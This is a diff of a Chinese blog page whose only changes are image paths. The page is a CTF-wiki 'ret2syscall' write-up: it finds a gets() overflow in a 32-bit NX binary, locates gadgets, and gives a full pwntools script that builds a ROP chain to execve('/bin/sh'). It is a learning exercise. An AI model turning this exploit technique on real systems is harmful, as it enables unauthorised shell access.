@@ -23,16 +23,16 @@
 <meta property="og:site_name" content="M4gne51um&#39;s blog">
 <meta property="og:description" content="基本ROP&#x2F;ROPgadget&#x2F;有&#39;&#x2F;bin&#x2F;sh&#39;情况下的系统调用">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/1.png">
-<meta property="og:image" content="http://example.com/2.png">
-<meta property="og:image" content="http://example.com/3.png">
-<meta property="og:image" content="http://example.com/4.png">
-<meta property="og:image" content="http://example.com/5.png">
+<meta property="og:image" content="http://example.com/2021/03/10/ret2syscall/1.png">
+<meta property="og:image" content="http://example.com/2021/03/10/ret2syscall/2.png">
+<meta property="og:image" content="http://example.com/2021/03/10/ret2syscall/3.png">
+<meta property="og:image" content="http://example.com/2021/03/10/ret2syscall/4.png">
+<meta property="og:image" content="http://example.com/2021/03/10/ret2syscall/5.png">
 <meta property="article:published_time" content="2021-03-10T06:38:24.000Z">
 <meta property="article:modified_time" content="2021-03-11T02:54:36.200Z">
 <meta property="article:author" content="Magnesium">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/1.png">
+<meta name="twitter:image" content="http://example.com/2021/03/10/ret2syscall/1.png">
   
   
   
@@ -284,19 +284,19 @@
                 <p>知识点：基本ROP&#x2F;ROPgadget&#x2F;有’&#x2F;bin&#x2F;sh’情况下的系统调用</p>
 <p>打算跟着ctf wiki一题一题地学起，手动实践的时候还是能学到很多东西的。</p>
 <p>首先是checksec，是32位程序，开启了栈堆不可执行保护，因此不能用shellcode来提权。</p>
-<p><img src="/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/03/10/ret2syscall/1.png" srcset="/img/loading.gif" lazyload></p>
 <p>打开ida查看源代码，存在gets函数栈溢出漏洞</p>
-<p><img src="/2.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/03/10/ret2syscall/2.png" srcset="/img/loading.gif" lazyload></p>
 <p>然后再搜索一下system和&#x2F;bin&#x2F;sh，发现只有&#x2F;bin&#x2F;sh</p>
-<p><img src="/3.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/03/10/ret2syscall/3.png" srcset="/img/loading.gif" lazyload></p>
 <p>那么可以通过gadgets构建ROP链，实现系统调用，具体资料如下</p>
 <p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</a></p>
 <p>简而言之就是需要利用gadgets实现函数execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)，那么应该往eax存入0xb（系统调用号），往ebx存入“&#x2F;bin&#x2F;sh”（通过pop ebx实现），往ecx与edx中存入0。尽管这是32位程序，函数调用参数通常是使用栈上数据，但在使用系统调用时，需要修改寄存器达到系统调用目的。</p>
 <p>那么接下来就要寻找合适的gadgets。</p>
-<p><img src="/4.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/03/10/ret2syscall/4.png" srcset="/img/loading.gif" lazyload></p>
 <p>用图上两个地方的gadgets就可以实现寄存器的修改。</p>
 <p>接下来寻找&#x2F;bin&#x2F;sh和int 80h的地址，就可以将&#x2F;bin&#x2F;sh pop入ebx中，并在最后调用int80h。</p>
-<p><img src="/5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/03/10/ret2syscall/5.png" srcset="/img/loading.gif" lazyload></p>
 <p>那么全部地址都凑齐了，就可以写exp了</p>
 <figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span> *<br><span class="hljs-variable">p</span> = <span class="hljs-function"><span class="hljs-title">process</span>(<span class="hljs-string">&#x27;./rop&#x27;</span>)</span><br><span class="hljs-variable">context.log_level</span> = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-variable">gdb.attach</span>(<span class="hljs-variable">p</span>)<br><br><span class="hljs-variable">binsh</span> = <span class="hljs-number">0</span><span class="hljs-variable">x080be408</span><br><span class="hljs-variable">int80</span> = <span class="hljs-number">0</span><span class="hljs-variable">x08049421</span><br><span class="hljs-variable">edx_ecx_ebx_ret</span> = <span class="hljs-number">0</span><span class="hljs-variable">x0806eb90</span><br><span class="hljs-variable">eax_ret</span> = <span class="hljs-number">0</span><span class="hljs-variable">x080bb196</span>    <span class="hljs-comment">//通过ROPgadget获取到的信息</span><br><br><span class="hljs-variable">p.recvuntil</span>(<span class="hljs-string">&#x27;What do you plan to do?\n&#x27;</span>)<br><span class="hljs-variable">payload</span> = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span> + <span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-variable">eax_ret</span>) + <span class="hljs-title">p32</span>(<span class="hljs-number">0</span><span class="hljs-variable">xb</span>) + <span class="hljs-title">p32</span>(<span class="hljs-variable">edx_ecx_ebx_ret</span>) + <span class="hljs-title">p32</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p32</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p32</span>(<span class="hljs-variable">binsh</span>) + <span class="hljs-title">p32</span>(<span class="hljs-variable">int80</span>)</span><br><span class="hljs-comment">//填充垃圾数据--系统调用号pop入eax并返回--exceve函数参数pop入对应寄存器并返回--调用int 80h</span><br><br><span class="hljs-variable">p.send</span>(<span class="hljs-variable">payload</span>)<br><br><span class="hljs-variable">p.interactive</span>()<br></code></pre></td></tr></table></figure>
                 
